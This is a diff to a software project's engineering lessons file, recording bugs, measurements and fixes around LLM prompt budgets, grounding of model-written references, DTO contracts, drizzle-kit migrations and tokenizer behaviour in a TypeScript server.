+Compare by CODE POINT — `[...text].length`, the unit `truncateCodePoints` cuts in — not by
+`.length`, which is UTF-16 units and calls a 3 000-character astral document shortened when the cap
+never touched it. `status` was deliberately left alone: the contract defines those four words in
+terms of the budget walk, and a document the ceiling shortened did reach the model in the state the
+run intended.
+
+### A grounding gate only ever fires on what the 4 000-character doc cap left standing
+
+The onboarding tour learned a third setup shape on 2026-08-18 — a script the repository committed,
+`./scripts/dev.sh` — and the gate that accepts it (`modules/onboarding/helpers.ts`,
+`setupCommandIsAuthorised`) is only half the feature. The other half is whether the model was ever
+shown the string. It cannot be: `.sh` files reach the input through no other route. The index does
+not parse them, the package walk asks `listFiles` for the *name* `package.json`, and the ranked
+samples are index output. The only path is a project document that happens to mention the script in
+prose.
+
+Measured against this repository's own clone: `MAX_DOC_CHARS` is 4 000
+(`modules/onboarding/constants.ts:253`) and `readDocs` cuts from the END, so of the two root
+documents only one carries the line. `README.md` is 8 822 characters and first names
+`./scripts/dev.sh` at character 4 482 — 482 past the cut, so the model never sees it. `AGENTS.md`
+is 8 870 characters and names it at 877, so it does. The feature works here on that margin alone,
+and a repository that documents its bootstrap script only in a long README gets no such command at
+all while every test stays green.
+
+The general shape, which is the part worth carrying: **when a feature depends on a fact reaching
+the model through prose, the cap is part of the feature.** Measure where the fact sits in the file
+rather than confirming the file is read — the two questions have different answers and only one of
+them is the one that matters. Cheap to check, one `node -e` over the clone:
+`const t=fs.readFileSync(p,'utf8'); [t.indexOf(needle), [...t].length]` against `MAX_DOC_CHARS`.
+
+
+### A contract field with `.default()` makes a MISSING WRITE invisible, not just a missing read
+
+`.default()` on a jsonb-backed contract field is required here — without it the day a field is
+added every stored document stops parsing ("A jsonb column is untyped input: parse it on read, or
+`.default()` never fires", under Codebase Patterns). What it also does is hide the other half: the
+producer that never sets the field writes a record that parses, reads as `0` or `[]`, and fails no
+gate anywhere.
+
+Measured on 2026-08-18, between the two halves of SPEC-04: after `chains_supplied`,
+`longest_chain_files`, `system_tokens` and `duration_ms` were added to `OnboardingDraft`, the
+real stored tour of `Holubinka/dev-digest` served all four as `0` through `GET
+/repos/:id/onboarding` — indistinguishable from a repository with no import graph. `pnpm arch`,
+`pnpm typecheck` and 1 206 unit tests were green throughout. TypeScript catches this on an object
+LITERAL (the four missing keys were five compile errors in `generate-executor.ts`), and catches
+nothing at all when the producer spreads, maps or builds the object any other way.
+
+So: for every newly defaulted field, write the assertion that fails when the writer omits it, and
+prove it by setting the field to its own default in the producer and watching the case go red —
+`chains_supplied: 0` in `generate-executor.ts` turned exactly two cases of
+`test/onboarding-generate.test.ts` red, and nothing else in the repository noticed.
+
+
+
+### A ceiling test that asserts the ceiling is REACHED locks in the overflow it was written to catch
+
+**Symptom.** Fixing a real defect turned `onboarding-generate.test.ts` red with
+`expected 6 to be 200`.
+**Cause.** The test was named "spends no more than MAX_PATH_PROBES reads on one answer" but
+asserted `expect(audit.probes).toBe(MAX_PATH_PROBES)` over a fixture of 210 tasks. That passes
+only while the answer overflows the ceiling. The fix — collecting path claims only from the tasks
+that grounding would actually keep — stopped the overflow, so the assertion that the ceiling was
+*hit* became an assertion that the defect was *present*.
+**Fix.** Split it. One test keeps the ceiling honest using a source that is genuinely uncapped
+(flows), and one asserts the new guarantee: probes from tasks equal `MAX_TASKS`, and
+`setup_commands` still ground — the list that used to vanish wholesale once the ceiling was
+reached inside the task loop. When a bound test fails after a fix, read whether it was measuring
+the bound or the thing overflowing it before touching the number.
+
 ## Codebase Patterns
+
+### The allowed-refs invariant is checkable in one line against a real PR
+
+A brief block's `refs` must be exactly what that block's rendered text puts in front of the
+model, and the whole invariant reduces to one filter over the assembled input:
+
+```ts
+[...buildAllowedRefs(fit.included)].filter((ref) => !fit.user.includes(ref))   // must be empty
+```
+
+Run against PR #20's real blast view and file list on 2026-08-16 (fetch `GET /pulls/:id/blast`
+and `GET /pulls/:id`, feed them into `buildBlocks` → `fitToBudget` → `buildAllowedRefs`; no model
+call, no spend): **0** of 106 allowed refs were absent from the prompt after the fix, and **105**
+of 214 were absent before it. Reach for this before believing a unit test that only ever sees a
+one-symbol fixture — a 170-file PR against a 40-path cap is where the two halves of the set come
+apart, and no hand-written fixture is that shape by accident.
+
+**Added 2026-08-16.** It is a test now as well as a diagnostic — see "An invariant maintained at
+the call site breaks once per call site" above. Keep running it against a real PR anyway: the
+same run confirmed 0 of 106 after the third fix, and it is the only check that sees the shapes a
+fixture author does not think of. That run is also where the caps got their numbers, because real
+data disagreed with the arithmetic — 4 of the 1835 rendered parts of PR #20's blast view are
+longer than 120 code points.
+
+### Clamp the parts of a rendered line, never the finished line
+
+A line assembled from untrusted parts and then truncated has lost the ability to say which parts
+survived: it is one string, and the names inside it are no longer addressable. So anything that
+declares a name printed — `blastBlock` adding a path or an endpoint label to the allowed set —
+must clamp that name **before** the line exists and register the clamped string, not the source
+one (`modules/brief/helpers.ts`, `part()` against `MAX_BLAST_PART_CHARS`).
+
+The line ceiling then follows from the part caps instead of being chosen beside them:
+`MAX_BLAST_FACT_CHARS` is 3 × `MAX_BLAST_PART_CHARS` + 32, which is why it moved when the part
+cap did. Pick the part cap from measured repository content, not from a round number — 120 looked
+generous for a file path and cuts four real ones in this repo.
 
 ### A DTO mapper without a return type is unchecked, even where the caller has one
 
@@ -230,6 +871,32 @@ field added off a `*Row` would have shipped over the wire with no contract decla
 **Fix.** Annotate every `to*Dto` with the contract type from `@devdigest/shared`, the way
 `toCandidateDto` (line 235) already does. The annotation is the only place the shape is checked;
 it is not documentation.
+
+### Second occurrence (2026-08-16), from the other side — a contract field the route never serves
+
+**Symptom.** `ReviewRecord` gained `head_sha`: the Zod contract, both vendored copies, the
+`reviews` table, migration `0020`, and a passing `test/contracts.test.ts`. `pnpm arch`,
+`pnpm typecheck`, 900 unit tests, `reviewer-core` and `diff -r` on the vendored pair were all
+green in three packages — and `GET /pulls/:id/reviews` still answered with the same 12 keys it
+answered with before, `head_sha` not among them. In the browser the field read `undefined`
+rather than `null`, because `client/src/lib/api.ts` parses nothing at runtime, so no layer
+between the column and the component had anything to say.
+
+**Cause.** The same root cause as the entry above, mirrored. `ReviewDto`
+(`modules/reviews/helpers.ts:22`) is a hand-written interface rather than `ReviewRecord`, and
+`GET /pulls/:id/reviews` (`modules/reviews/routes.ts:165`) declares no `schema.response`, so the
+contract and the payload are two independent declarations that merely happen to agree. The
+entry above measured the extra-field direction, where a field ships that no contract declares;
+this is the missing-field direction, and it is the more expensive of the two — an undeclared
+extra is noise, whereas a declared field that never arrives is a feature that silently does not
+exist, in a shape every typecheck endorses.
+
+**Fix.** Widening a record contract in `vendor/shared` is not done until the mapper that serves
+it is widened too — `reviewToDto`, `toScanDto`, and their kin. Confirm on the wire, not in the
+type: `curl -s localhost:3001/pulls/<id>/reviews | python3 -c "import sys,json;
+print(sorted(json.load(sys.stdin)[0]))"` prints the key list the client will really see. The
+structural fix is the annotation the entry above already prescribes; `ReviewDto` still does not
+carry it as of 2026-08-16, so the next widening of `ReviewRecord` has the same hole waiting.
 
 ### Truncate untrusted text BEFORE `wrapUntrusted`, never after
 
@@ -574,6 +1241,332 @@ the row and the badge disagreeing about one document. BOTH callers must pass the
 just labelled correctly; `test/context.it.test.ts` asserts create and rescan agree. Decided by the
 human on 2026-08-14 after the question below was raised.
 
+### The allowed-refs set is the PROMPT's inventory, not the gatherer's
+
+`modules/brief` grounds every model reference against a set built from the blocks that survived
+the budget walk (`fitToBudget(...).included`), never from the sources that were gathered
+(`helpers.ts` → `buildAllowedRefs`). The two differ exactly where the walk cut something: a blast
+answer the budget dropped would otherwise still license every endpoint label and caller file it
+named, a dropped spec would license its own path, and on a 400-file PR the 360 paths that were
+never printed would be members. Each of those is a reference to a document the model never saw,
+stamped as grounded. `test/brief-allowed-refs.test.ts` is the file that carries the distinction —
+`test/brief-service.test.ts` alone could not, because nothing gets dropped in a small fixture.
+
+### `evicted_count` is a column because the read cannot reconstruct it
+
+`pr_brief.evicted_count` is the running total of states evicted for a PR, stamped on the row the
+write just persisted (`modules/brief/repository.ts`). Deriving "history truncated" from
+`rows.length >= max_states` is the obvious alternative and it lies about the PR sitting at exactly
+the cap, which has evicted nothing. An evicted row cannot carry the fact of its own eviction, so
+the surviving newest row carries it — and the delete, the count and the stamp are one transaction,
+because a crash between them leaves a row claiming a deletion that never happened.
+
+### An eviction walk must exclude the row it just wrote, and `limit(max)` is not how
+
+`upsertBrief` keeps `maxStates - 1` OTHER newest rows plus the one it wrote, rather than the
+newest `maxStates` outright. Both look identical while the new row is the newest — which it
+normally is, since `computed_at` is `new Date()` at write time. They differ when twenty states
+carry timestamps ahead of the clock (an import, a machine whose time moved): selecting the newest
+`maxStates` and adding this row keeps 21, and selecting the newest `maxStates` INCLUDING it
+deletes what the call just persisted and returns `undefined`. Staged in
+`test/brief.it.test.ts` — "never evicts the row it just wrote"; a mutation removing the exclusion
+reds four cases in that file.
+
+### A block exempt from the drop order is elastic, not exempt from the budget
+
+`fitToBudget`'s `DROP_ORDER` deliberately omits `diff_stats` — a brief that does not know which
+files changed is a different answer, not a degraded one. Until 2026-08-16 that also made it
+**unbounded**: once every other block was dropped the function returned whatever `diffStatsBlock`
+rendered, `run()` sent it, and `input_tokens_counted` recorded the overflow without refusing it.
+The only cap on that block is `MAX_FILE_PATHS` (40) × `MAX_FILE_PATH_CHARS` (400) counted in CODE
+POINTS, and **a code-point cap is not a token bound**: measured with `TiktokenTokenizer` and the
+real 914-token system prompt, 40 × 400 ASCII is 3199 tokens, 40 × 400 `U+1F600` is 32939 and
+40 × 400 `U+2A6B2` is 64719 — 8.1× a budget the feature states it holds. It is reachable, not
+theoretical: `pr_files.path` is GitHub's `filename` inserted verbatim (`modules/pulls/routes.ts`)
+and git permits any non-NUL byte in a name.
+
+The fix is a `shrink(keep)` closure on `BriefBlock`, re-rendering the block from fewer paths after
+the drop loop, binary-searched on the ITEM COUNT rather than on code points — half a path is a
+reference to a file that does not exist. **Whatever shortens such a block must rebuild its `refs`
+from exactly what survived**, which is why `shrink` returns a whole block and not a string; see the
+allowed-refs entry above. The pattern generalises: if a block cannot be dropped, it needs an
+elastic axis, or the budget is an intention rather than a bound.
+
+### A service holding instance state is memoised by the container, never constructed by a route
+
+`BriefService` carries the single-flight `inFlight` map that makes AC-45 true — two tabs on one PR
+state pay for one model call. Until 2026-08-16 `brief/routes.ts` did `new BriefService(container,
+new BriefRepository(container.db), app.log)`, so the lock held **by registration count** rather
+than by construction: a second `app.register`, or the first non-HTTP caller (an MCP tool, a review
+executor), would have got a fresh empty `Map` and nothing would have said so. The remedy is the
+`blastService` shape — a memoised getter on `platform/container.ts`, the port declared
+structurally in the slice's own `types.ts` (`BriefReader`, beside `BlastReader`), and the route
+reduced to `const service = container.briefService;`.
+
+Two things this does NOT get caught by. `no-db-from-routes` matches imports of
+`src/db/(schema|client)`, and `container.db` needs no such import, so `pnpm arch` was green
+throughout. And a memoisation bug is invisible to any test that builds the service itself —
+`test/brief-routes.test.ts` asserts `container.briefService === container.briefService` and that an
+`overrides.brief` actually answers the route, because those are the two halves the finding was
+about.
+
+The logger moved from the constructor to `compute(workspaceId, prId, log)` in the same change: the
+composition root has no logger of its own, and `req.log` is a better one than `app.log` anyway.
+`ReviewService`'s `logger?: Logger` method parameter is the existing precedent.
+
+### `BlastEndpoint.line` is 0 for every endpoint the indexer produces — treat it as "unknown"
+
+**Symptom.** `BlastRadiusView.symbols[].endpoints[].line` is typed `z.number().int()` and reads as a
+real offset. Against the live index on 2026-08-16, the blast answer for `Holubinka/dev-digest` PR #20
+(`curl localhost:3001/pulls/<id>/blast`) carries **125 endpoints and all 125 have `line: 0`**, while
+symbol and caller lines are genuine. Every fixture in `server/test/` uses positive endpoint lines, so
+nothing in the suite can express this.
+
+**Cause.** The indexer resolves which FILE an endpoint sits in and not where inside it, and spells the
+absent offset `0` rather than making the field nullable. `0` passes `z.number().int()`, so no parse and
+no typecheck objects.
+
+**Fix.** Any consumer deriving a displayable line must test `line > 0` and treat everything else as
+"no line", not as line zero. `modules/brief/helpers.ts` · `blastBlock` does this in `noteLine`, which is
+why a blast-admitted brief reference can end up with no `ref_lines` entry while still being a perfectly
+good reference. Rendering `path:0` would be a placeholder wearing a number: AC-62 admits a suffix only
+where the number is valid, and the client's own definition of a usable line (`/^[1-9][0-9]{0,6}$/`,
+`plans/11` P4·8) rejects `0` one layer later — so the text would claim a line the jump then refuses.
+The guard belongs per FACT, not per file: a file whose endpoint entry has no line may still get one
+from a later symbol or caller fact about the same path.
+
+### A number keyed by PATH is a guess when the input carries a number per FACT
+
+**Symptom.** `pr_brief.ref_lines` is keyed by reference, i.e. by path, and the blast answer it is
+derived from carries a line per fact — a symbol declaration, a call site, an endpoint. Three risks
+citing `src/middleware/ratelimit.ts` therefore rendered the same `:45`, the same `#L45` GitHub link
+and the same diff jump, off whichever fact `blastBlock` happened to print first. Reviewer round 11
+called it, correctly: the number located the file's first fact, not the reference.
+
+**Cause.** `noteLine` was first-occurrence-wins (`modules/brief/helpers.ts`, until 2026-08-17). Every
+number it stored was real; which one a reader saw was a function of print order and of nothing else,
+and nothing downstream could tell the difference.
+
+**Fix (2026-08-17).** A path keeps a line only while every located fact about it names the same one;
+a disagreement writes a `null` TOMBSTONE that later facts cannot lift. The guard now lives in
+`mergeRefLine`, shared with `buildRefLines` so the cross-block merge cannot acquire a different rule
+— read that name, not `noteLine`, in the `BlastEndpoint.line` entry above.
+
+**Two ways of counting that look equivalent and are not.** Measured over four real blast answers
+(PRs #17, #19, #20, #21) on 2026-08-17: first-occurrence-wins produced 105 numbers, agreement keeps
+**53**. Counting FACTS instead of NUMBERS would have kept 43, and both of the six it loses are wrong
+to lose — a fact with `line: 0` (all 125 endpoints of PR #20) establishes nothing and so cannot
+disagree with anything, and one caller reaching two changed symbols is printed once under each, which
+is four paths in those four PRs where the same measurement arrives twice. Halving the count is the
+fix working; losing the duplicates would have been a second bug with the same shape.
+
+### The annotation that closes a DTO hole cannot check a column the schema left as plain `text`
+
+**Symptom.** `reviewToDto` is annotated `: ReviewRecord` as of 2026-08-17, which closes the hole the
+two entries above describe — proved both ways against the live tree: adding `bogus: review.prId` to
+the literal fails `TS2353`, deleting `head_sha` fails `TS2741`. One field would not compile:
+`verdict`.
+
+**Cause.** `reviews.verdict` is `text('verdict')` while `reviews.kind` beside it — and
+`pr_intent.confidence`, `findings.severity`, `pull_requests.status`, every enum column in
+`pr_brief` — is `text(name, { enum })`, the TypeScript-level vocabulary this schema's own comment
+(`db/schema/reviews.ts:99-102`) says is the pattern. So the row type is `string | null` against the
+contract's `Verdict | null`, and the mapper carries a cast.
+
+**Fix.** Narrowing the column removes the cast and generates no migration — `text(name, { enum })`
+emits the same SQL. It is a schema change, so it was left for a human; all 285 rows in the local
+database already hold one of the three values (measured 2026-08-17). Until then, treat the cast as
+the one unchecked field on that payload.
+
+### Asking `listFiles` for `.json` finds one of this repo's five packages, not five
+
+`GitClient.listFiles` filters by `extname` and by exact NAME, and the two are not
+interchangeable. Measured 2026-08-17 by pointing `SimpleGitClient` at this repository as a clone,
+`maxDepth: 2`, `maxFiles: 12`:
+
+- `names: ['package.json'], extensions: []` → all five manifests (`client`, `e2e`, `mcp`,
+  `reviewer-core`, `server`), `bounded: false`, 5 ms.
+- `extensions: ['.json']` → 12 files, `bounded: true`, and exactly **one** of them is a manifest.
+  The eleven ahead of it are `.claude/settings.json`, `.mcp.json`, `.pr-self-review/run/*.json`
+  and `.retro/stats.json`, which sort first.
+
+Two consequences. A package scan must ask by name, and the ceiling must be applied **after** the
+filter — `simple-git.ts` slices `deduped` at the end of `listFiles` and never inside `walkDocs`,
+which is why the twelve above are twelve matches rather than the first twelve files visited.
+
+### `MockGitClient.listFiles` walks its `tree` verbatim — `EXCLUDED_WALK_DIRS` is not modelled
+
+The mock honours `roots`, `extensions`, `names`, `maxDepth`, `maxFiles` and `maxFileBytes`, and as
+of 2026-08-17 `test/git-list-files.test.ts` pins it to the same answers as `SimpleGitClient` for
+all six. It does **not** skip `node_modules`, `dist`, `vendor` or the rest of
+`adapters/git/constants.ts`: a fixture path under one of them comes back from the mock and never
+from a clone. So "no package out of a dependency directory" is only assertable against
+`SimpleGitClient` over a temp clone. The trap is the fix that suggests itself when a mock-backed
+test disagrees — a second exclusion list inside the module, which is exactly what that constants
+file's own comment exists to prevent.
+
+### An output cap no criterion states is anchored on the supply that feeds it
+
+`modules/onboarding/constants.ts` caps ten model-written arrays and strings, and the spec states
+a number for exactly one of them (AC-72, four links). For the rest, the defensible anchor is the
+code that bounds what could ever be grounded, not a preference: `MAX_FLOWS = 4` sits one below
+`CRITICAL_PATH_ROOTS = 5` (`modules/repo-intel/service.ts:745`), because a flow whose steps must
+come from those chains cannot survive past five; `MAX_FLOW_STEPS = 6` is twice `1 + BFS_DEPTH`
+(`modules/repo-intel/constants.ts:59`), the longest chain the facade can return. A cap set above
+its supply never binds and is therefore not a cap at all — it only looks like one in review.
+
+The companion lesson is about the docstring rather than the number. `plan-verifier` marked step 2
+of `plans/12-onboarding-tour-server-generation.md` PARTIAL on 2026-08-17 because 22 of 30
+constants named both a reason and a source and 8 named neither, resting instead on the shared
+block above their group. **A group block explains why the group of ceilings exists; it can never
+say why one of them is that number**, and the eight it covered were the ones whose numbers came
+from nowhere a reader could check. Where the source is a criterion, cite it by number — the
+missing `AC-72` on `MAX_LINKS_PER_SECTION` was the clearest instance of the same gap.
+
+### Stamping a failure on a full-row upsert has to read the previous row first
+
+`repository.upsertIndexState` writes **every** column of `repo_index_state`, so the obvious
+failure stamp — `safePersist(repo, id, '', 'failed', 0, 0, …)` — is not a status change, it is a
+row replacement that erases `last_indexed_sha`. That sha is what `modules/blast/service.ts:100-113`
+uses as `linkSha` for every line number it renders, so a failed **re**-index would destroy the
+provenance of a neighbouring feature while looking like a one-word change. `pipeline/full.ts`
+therefore reads `tryGetIndexState(repoId)` inside its catch and carries `lastIndexedSha`,
+`filesIndexed` and `filesSkipped` forward: the stamp costs the status and nothing else
+(2026-08-17, plan 13 P1.9, which called this out as a step of its own).
+
+The general shape: when a partial-knowledge writer sits on a full-row upsert, "update one column"
+does not exist. Either read-modify-write, or give the table a column the failure path can move on
+its own. Nothing in the type system distinguishes the two — `IndexStateUpsert` demands all seven
+fields whether you know them or not, which is exactly what makes zeros look like an answer.
+
+### Grounding a command needs the authorising file's TEXT; its path only proves the wrong thing
+
+A model-written `docker compose up -d postgres redis` cites `docker-compose.yml`, and that file
+exists, so an existence check passes and the command ships. Run over this repository's own files on
+2026-08-17, the real `docker-compose.yml` declares exactly one service — `postgres` — and the
+command came out of `groundOnboarding` DROPPED and counted, which is the correct answer and the one
+a path-only check cannot reach. `OnboardingSources.composeSources` therefore carries `{ path, text }`
+rather than a list of paths, and `composeServices()` (`modules/onboarding/helpers.ts`) reads the
+keys one level under `services:` with a line scanner — the repository has no YAML dependency and
+does not need one, because a file the scanner cannot read yields an empty set and every service
+named against it is dropped, which is the safe direction.
+
+Worth knowing before the demo: `specs/assets/SPEC-03-onboarding-tour.png` shows
+`docker compose up -d postgres redis`, and on DevDigest itself the `redis` half will never appear —
+there is no such service in the compose file. That is the grounding working, not a defect.
+
+The generalisation is the useful part: for any claim of the form "X authorises Y", check what the
+authorisation actually asserts. A `cp A B` is authorised by `A` being the cited file (not merely by
+`A` existing), a `<manager> <script>` by the script being a key of THAT package's own manifest, and
+a compose service by the file declaring it. Each of the three was one `.has()` away from being a
+check that always passes.
+
+### With fenced inputs, `selectWithinBudget` decides WHICH block is cut and never how
+
+`_shared/budget.ts` truncates the first oversized candidate with `truncateToBudget`, which takes a
+code-point prefix of the rendered string. On a block wrapped in `<untrusted source="…">…</untrusted>`
+that prefix ends inside the fence: the closing tag is gone and everything the model reads after it
+is trusted prose — the one cut AC-79 exists to forbid. So a caller whose candidates are fenced uses
+the walk for its STATUS (`included` / `truncated` / `dropped`, one cut point, reverse priority) and
+re-does the cut itself, dropping whole fenced items from the tail and only re-fencing what is left
+(`modules/onboarding/prompt.ts`, `truncateBlockToBudget`; used at
+`modules/onboarding/generate-executor.ts`). The walk's own `blocks` output is discarded there.
+
+Two smaller things fall out of the same reasoning. Each candidate is measured as
+`BLOCK_SEPARATOR + block.text`, because the separator ships too, and the walk's budget is the
+ceiling minus the system prompt AND minus the user message's fixed scaffold (its header and the
+trusted preamble) — which is what turns "roughly within budget" into
+`input_tokens_counted <= ONBOARDING_TOKEN_BUDGET` as an equality the test can assert. Subtracting
+only the system prompt overshoots by the preamble, ~500 characters here (2026-08-17, plan 12 P5).
+
+### `sanitizeRelativePath('.')` returns null, so a root package path cannot go through it
+
+`_shared/repo-paths.ts` filters out `.` segments and refuses an empty result, which makes `.` — the
+repo-relative path of a root package — an invalid path by its own rules. It is the right behaviour
+for a path and the wrong gate for a KEY: `modules/onboarding/helpers.ts` matches a model-written
+`package_path` against the set of packages the walk found, so it normalises (`./x` → `x`, `''` → `.`)
+and looks the value up rather than sanitizing it. Membership in a code-authored set is the stronger
+check of the two — nothing outside the walk's own output can pass it. Sanitize a string you are
+about to USE as a path; look up a string that names one of your own records (2026-08-17, plan 12 P4).
+
+### A port RETURNS the fact only the adapter knows; a module that restates it becomes copy three
+
+`package_scan.excluded_dirs` had to disclose which directories the walk skipped, so
+`modules/onboarding/packages.ts` kept `EXCLUDED_SCAN_DIRS` — an eight-name echo of
+`adapters/git/constants.ts`, itself an echo of `modules/repo-intel/constants.ts`. The copy was
+forced by architecture (`no-service-to-adapter-impl` stops the module importing the adapter's
+list) and guarded by a hand-written equality test, which is as good as a copy gets and still one
+list in three places. `listFiles` already returned `bounded` — a fact only the adapter knows —
+and `excludedDirs` is the same kind of fact.
+
+**Fix (2026-08-18).** `GitClient.listFiles` returns `excludedDirs` beside `files` and `bounded`;
+`EXCLUDED_SCAN_DIRS` and its drift test were deleted together. The test existed only to hold the
+echo to the port's list, so with no echo there was nothing left to hold — deleting the constant
+and keeping the test would have left a test of nothing. **What to check:** when a module has to
+report something only an adapter can know, widen the port's RESULT before copying the value; a
+drift test is the sign you already chose wrong.
+
+### A single-flight that joins before its gate answers the FIRST caller's gate, not yours
+
+`OnboardingService.generate` checks `inFlight` (step 2) BEFORE it reads the index state and
+refuses (step 3), which is the order plan 13 specifies and the order AC-74 needs: a second caller
+must receive the running generation's result, not start a second one. The consequence is only
+visible live. On 2026-08-18 a `POST /repos/:id/onboarding/generate` issued straight after
+`update repo_index_state set status='failed'` did NOT answer `409 onboarding_index_failed` — it
+hung for 15s and then for 111s, because a generation started minutes earlier was still running and
+the new request joined it. Once nothing was in flight the same request refused in 13ms.
+
+This is correct, not a defect, and it is worth knowing before debugging a gate that "does not
+fire": a refusal is a statement about the state at the moment a generation STARTS. Anything that
+joins an in-flight run inherits that moment. When verifying a gate by hand, drain the in-flight
+run first — `select generated_at from onboarding where repo_id=…` twice, five seconds apart.
+
+### Two log lines per generation, and the duplication is real
+
+`OnboardingGenerateExecutor.run` writes `'onboarding tour generated'` (`generate-executor.ts:228`)
+carrying the five drop counters, the inputs, the package-scan totals, `attempts`, `tokensIn` and
+`costUsd`. `onboarding/routes.ts` then writes `'onboarding generation'` with almost the same
+fields read off the record. Plan 13 mandated the route line and was written before slice A
+existed, so neither author could see the other's.
+
+Kept rather than silently dropped, because the obligation differs: AC-40 is this slice's, and
+`container.onboardingGenerator` is overridable — every integration test replaces it with a canned
+generator that logs nothing, so delegating the audit to the collaborator makes it conditional on
+which implementation is wired. The cost is one duplicated line per paid generation. If an operator
+finds that noisy, the route line is the one to drop, and this is the note that says why it was
+there.
+
+### `selectWithinBudget` can only ever report `truncated` on the FIRST candidate
+
+`modules/_shared/budget.ts:91` truncates a candidate only while `blocks.length === 0`; every
+later candidate that does not fit is `dropped`, and so is everything behind it. For an input
+offered ITEM BY ITEM — the samples, the project documents, and since 2026-08-18 the critical-path
+chains — that means no individual item is ever `truncated`. The `truncated` on that input's row
+in `inputs[]` is an AGGREGATE computed in `inputRow` (`generate-executor.ts`): some items shipped
+and some did not.
+
+It cost two retunes of one fixture on 2026-08-18. A test that squeezes a split input expecting
+its row to read `truncated` has to leave room for at least one whole item — squeeze one notch
+harder and the row reads `dropped`, because zero of them shipped. Budget the fixture as
+`ceiling − system − scaffold − everything of higher priority ≥ one item`, and remember the
+higher-priority inputs now include one block per chain.
+
+### The clock and the budget are one decision, so they live in one file
+
+`modules/onboarding/sizing.ts` holds `budgetForIndex(filesIndexed)` and
+`timeoutForBudget(budget)`, and the second takes the first's output rather than the file count on
+purpose. A budget raised without its clock raised with it times out on exactly the repositories
+the budget was raised for, and a timeout is a generation the provider has already been paid for
+whose answer is thrown away (`SPEC-04 § D12`). Keeping them in separate files, or deriving both
+from `files_indexed` independently, is how the pair drifts by one edit.
+
+The value arrives at the generator as a PARAMETER (`OnboardingGenerateInput.filesIndexed`) from
+the snapshot the service already read at its index gate — not through the container. The
+generation port is deliberately unable to read the index state at all
+(`generation-types.ts:36-43`), and a number handed over is not a port: it costs one field, while
+widening the port would cost the property that this feature can never index.
+
+
 ## Tool & Library Notes
 
 ### `break` out of a `for await` destroys the stream, so teardown errors land inside the `try`
@@ -733,6 +1726,184 @@ written.
 `this.tree` (`adapters/mocks.ts`). A mock that mutates a shared fixture is a test-ordering bug
 waiting for the first test that writes.
 
+### `drizzle-kit generate` emits a composite-PK migration that cannot run, and asks you for the old key's name
+
+**Symptom.** Switching `pr_brief` from `pr_id` to a `(pr_id, head_sha)` composite key produced
+`0018_blue_ultimates.sql` with `ADD CONSTRAINT ... PRIMARY KEY("pr_id","head_sha")` **before**
+`ADD COLUMN "head_sha"`, plus a commented-out `DROP CONSTRAINT "<constraint_name>"` and a note
+saying "we can't automatically get name for primary key".
+**Cause.** drizzle-kit 0.30 orders constraint statements ahead of column statements and has no way
+to read the implicit name Postgres gave an inline `PRIMARY KEY`.
+**Fix.** Both halves are hand edits, and the tool asks for one of them. The old name is
+`<table>_pkey` — confirm it rather than assume:
+`SELECT constraint_name FROM information_schema.table_constraints WHERE table_name='pr_brief' AND
+constraint_type='PRIMARY KEY'`. Then reorder to drop the old key, add every column, add the
+composite key. This is on top of the two-run rule in `AGENTS.md`: run 1 added the columns and
+switched the key, run 2 (`0019`) dropped `json`.
+
+### A dev server on `tsx watch` picks up an in-progress branch, so a live `curl` may already be your code
+
+`./scripts/dev.sh` runs the API under `tsx watch`. During plan 10 a `pr_brief` row appeared with
+`detail` strings in the exact format of helpers written minutes earlier — the watcher had reloaded
+and the client had computed a brief through the new module. Useful (the real entry point exercises
+itself), but it also means a "pre-existing" row may be yours: check `computed_at` against the
+session, remembering the column is UTC and the shell is not.
+
+### The unrunnable `pr_brief` migration was a constraint change, not a `pr_brief` change (2026-08-16)
+
+Complement to the composite-PK entry above, so the next agent does not hand-edit a file that needs
+no editing. Adding `pr_brief.ref_lines` (jsonb, `NOT NULL DEFAULT '[]'`) and `reviews.head_sha`
+(text, nullable) in one run emitted `0020_broad_steel_serpent.sql` as exactly two `ADD COLUMN`
+statements — no constraint statement, no `<constraint_name>` placeholder, no reordering needed, and
+no TTY prompt, because the run dropped no column for a new one to be a rename of. The 0018 hazard
+belongs to `PRIMARY KEY` / constraint edits, which drizzle-kit 0.30 emits before the columns they
+depend on; an add-only run does not reach that path.
+
+**Reading the SQL is still how you know**, and it is two commands:
+`grep -cE 'ADD COLUMN' <file>` against `grep -nE 'CONSTRAINT|PRIMARY KEY|DROP' <file>` — the second
+printing nothing is the all-clear. Prove the `DEFAULT` reached existing rows against the database
+rather than the file: `SELECT count(*) FILTER (WHERE ref_lines = '[]'::jsonb) FROM pr_brief` returned
+2 of 2, which is what makes "old rows read as `[]`, no data migration" a measurement instead of a
+claim.
+### `TiktokenTokenizer` answers `chars/4` after one failure, for the rest of the process
+
+`count()` (`src/adapters/tokenizer/index.ts:31-41`) lazily loads the `cl100k_base` BPE ranks. If
+that throws **once** it sets `broken = true`, and every later call returns
+`approxTokens` — `Math.ceil(text.length / 4)` — for the lifetime of the process. There is no log
+line, no flag on the return value, and no way for a caller to tell a real count from the
+heuristic. The fallback is deliberate and right for the renderer it was written for, which must
+never throw mid-render.
+
+It is not right for a caller that has to **guarantee** a bound. A requirement of the form "the
+model input must not exceed N tokens" is enforced exactly as strongly as the encoder that happened
+to load: a budget walk passes, the log says 7 900, and the real input is whatever `chars/4`
+mis-estimated. Any feature that must hold such a bound needs a tokenizer that can *report*
+degradation, not one that absorbs it — decide that before writing the acceptance criterion, not
+after.
+
+The file's header comment says "in-process, and two callers". There are at least seven:
+`modules/context/scan-executor.ts:86`, `modules/context/service.ts:463,629`,
+`modules/conventions/service.ts:234`, `modules/skills/service.ts:89`,
+`modules/reviews/run-executor.ts:707`, plus the repo-map budget search it was written for. Counted
+2026-08-16; treat the comment's scope claim as stale rather than as a boundary.
+
+### `startPg()` from a scratch script exercises DB code for real without an `*.it.test.ts`
+
+To prove a write actually lands in Postgres when the plan does not authorise a new integration
+file, call `test/helpers/pg.ts:startPg()` from a scratch script: it starts an isolated
+`pgvector/pg16` container, runs the migrations and hands back a Drizzle handle, so the dev
+database on 5434 is never written to. Used 2026-08-17 to confirm that P1.9's failure stamp is
+accepted by the real `repo_index_state` (`status` is plain `text`, no enum or check constraint)
+and reads back through `tryGetIndexState` as `degraded: true, degradedReason: 'index_failed'`
+with the previous sha intact.
+
+Two mechanics cost a turn each, on top of the CWD rule already recorded under *What Works*:
+
+- The file must be **`.mts`**. A `.ts` file in a directory with no `"type": "module"` is compiled
+  by tsx as CJS, and every top-level `await` fails with *"Top-level await is currently not
+  supported with the cjs output format"*.
+- The script may import **server files only**. `import { eq } from 'drizzle-orm'` resolves from
